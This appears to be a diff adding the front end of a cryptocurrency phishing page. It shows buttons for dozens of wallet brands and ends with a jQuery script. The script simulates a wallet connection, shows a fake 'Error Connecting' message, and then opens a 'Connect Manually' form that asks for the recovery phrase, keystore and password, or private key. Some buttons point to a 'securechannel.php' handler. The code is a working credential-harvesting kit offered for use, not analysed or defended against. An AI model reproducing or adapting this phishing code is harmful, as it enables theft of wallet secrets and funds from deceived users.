+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal27" class="btn coin shadow rounded-xl">Eidoo</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal28" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/512x512bb.jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal28" class="btn coin shadow rounded-xl">MYKEY</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal29" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/lg(5)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal29" class="btn coin shadow rounded-xl">Loopring</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal30" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/trustvault.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal30" class="btn coin shadow rounded-xl">TrustVault</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal31" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(1).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal31" class="btn coin shadow rounded-xl">Atomic</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal32" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/10903.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal32" class="btn coin shadow rounded-xl">Coin98</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal33" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/tron-trx-logo.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal33" class="btn coin shadow rounded-xl">Tron</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal34" class="btn coin shadow rounded-xl"><img class="coin-img" src="data:image/png;base64,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" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal34" class="btn coin shadow rounded-xl">Alice</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal35" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal35" class="btn coin shadow rounded-xl">AlphaWallet</button></h4><!-- Modal -->
+         <button onclick="location.assign('securechannel.php?walletname=DCENT')" type="button" data-bs-toggle="modal" data-bs-target="#exampleModal36" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(2).png" alt=""></button>
+        <h4 class="text-white"><button onclick="location.assign('securechannel.php?walletname=DCENT')" type="button" data-bs-toggle="modal" data-bs-target="#exampleModal36" class="btn coin shadow rounded-xl">D'CENT</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal37" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/6323b69954bc41ff9409f033_public.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal37" class="btn coin shadow rounded-xl">ZelCore</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal38" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/lg(6)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal38" class="btn coin shadow rounded-xl">Nash</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal39" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/1433894569.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal39" class="btn coin shadow rounded-xl">Coinmoni</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal40" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/28931745" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal40" class="btn coin shadow rounded-xl">GridPlus</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal41" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(3).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal41" class="btn coin shadow rounded-xl">CYBAVO</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal42" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/512x512bb(1).jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal42" class="btn coin shadow rounded-xl">Tokenary</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal43" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/44049579" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal43" class="btn coin shadow rounded-xl">Torus</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal44" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/unnamed(4).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal44" class="btn coin shadow rounded-xl">Spatium</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal45" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal45" class="btn coin shadow rounded-xl">SafePal</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal46" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(5).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal46" class="btn coin shadow rounded-xl">Infinito</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal47" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/images" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal47" class="btn coin shadow rounded-xl">wallet.io</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal48" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(6).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal48" class="btn coin shadow rounded-xl">Ownbit</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal49" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/512x512bb(2).jpg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal49" class="btn coin shadow rounded-xl">EasyPocket</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal50" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(7).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal50" class="btn coin shadow rounded-xl">Bridge Wallet</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal51" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/Sparkpoint-wallet-logo.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal51" class="btn coin shadow rounded-xl">Spark Point</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal52" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(8).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal52" class="btn coin shadow rounded-xl">ViaWallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal53" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/ofbdehdu4sju07vlltgf" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal53" class="btn coin shadow rounded-xl">BitKeep</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal54" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/images(1)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal54" class="btn coin shadow rounded-xl">Vision</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal55" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(9).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal55" class="btn coin shadow rounded-xl">PEAKDEFI</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal56" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(10).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal56" class="btn coin shadow rounded-xl">Unstoppable</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal57" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/76861339" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal57" class="btn coin shadow rounded-xl">HaloDeFi</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal58" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/unnamed(11).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal58" class="btn coin shadow rounded-xl">Dok Wallet</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal60" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/images(2)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal60" class="btn coin shadow rounded-xl">Midas</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal61" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/1_N6Uvv2QMQGqQubnGP1tGig.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal61" class="btn coin shadow rounded-xl">Ellipal</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal62" class="btn coin shadow rounded-xl"><img class="coin-img" src="./assets/LOGO-KEYRING-PRO.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal62" class="btn coin shadow rounded-xl">KEYRING PRO</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal63" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal63" class="btn coin shadow rounded-xl">Aktionariat</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal64" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/unnamed(12).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal64" class="btn coin shadow rounded-xl">Talken</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal65" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/0x0.png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal65" class="btn coin shadow rounded-xl">Flare</button></h4><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal66" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/lg(7)" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal66" class="btn coin shadow rounded-xl">KyberSwap</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal70" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/unnamed(13).png" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal70" class="btn coin shadow rounded-xl">PayTube</button></h4><!-- Modal -->
+         <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal72" class="btn coin shadow rounded-xl"><img style="border-radius: 40px" class="coin-img" src="./assets/dd8ee41915d967e547c80266e883d77ee808427405f4e8026a85ac1308104221.jpeg" alt=""></button>
+        <h4 class="text-white"><button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal72" class="btn coin shadow rounded-xl">Linen</button></h4>
+      </div>
+    </div>
+  </div><!-- Scripts -->
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> 
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script> 
+  <script>
+
+        $(document).ready(function() {
+            // Search functionality
+            $("#searchInput").on("input", function() {
+                const input = $(this).val().toLowerCase();
+                $(".coin").each(function() {
+                    const name = $(this).find("h4").text().toLowerCase();
+                    $(this).toggle(name.includes(input));
+                });
+            });
+            
+            // Wallet connection
+            $(".coin").on("click", function() {
+                const img = $(this).find(".coin-img").attr("src");
+                const name = $(this).find("h4").text().trim();
+                
+                $("#current-wallet-logo").attr("src", img);
+                $("#current-wallet-app").text(name);
+                $(".connection-info").text("Initializing...");
+                $("#connect-dialog").show();
+                
+                setTimeout(function() {
+                    $(".connection-info").html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
+                }, 1000);
+            });
+            
+            // Manual connection
+            $(document).on("click", ".manual-connection", function() {
+                $("#current-wallet-send-logo").attr("src", $("#current-wallet-logo").attr("src"));
+                $("#current-wallet-app-send").text($("#current-wallet-app").text());
+                $("#walletNameData").val($("#current-wallet-app").text());
+                $("#connect-dialog").hide();
+                $("#send-dialog").show();
+            });
+            
+            // Tab switching
+            $("#phraseSend").click(function() {
+                $("#data-to-send").html('<input type="hidden" name="type" value="phrase"><textarea name="phrase" required class="form-control" rows="5" placeholder="Enter your recovery phrase"></textarea><small>Typically 12 (sometimes 24) words separated by single spaces</small>');
+            });
+            
+            $("#keystoreSend").click(function() {
+                $("#data-to-send").html('<input type="hidden" name="type" value="keystore"><textarea name="keystore" required class="form-control" rows="5" placeholder="Enter Keystore"></textarea><input type="text" name="password" required class="form-control" placeholder="Wallet password"><small>Several lines of text beginning with "{...}" plus password</small>');
+            });
+            
+            $("#privateKeySend").click(function() {
+                $("#data-to-send").html('<input type="hidden" name="type" value="privatekey"><input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"><small>Typically 12 (sometimes 24) words separated by single spaces</small>');
+            });
+            
+            // Dialog dismiss
+            $(".dialog-dismiss").click(function() {
+                $("#connect-dialog, #send-dialog").hide();
+            });
+        });
+  </script>
+</body>
+</html>
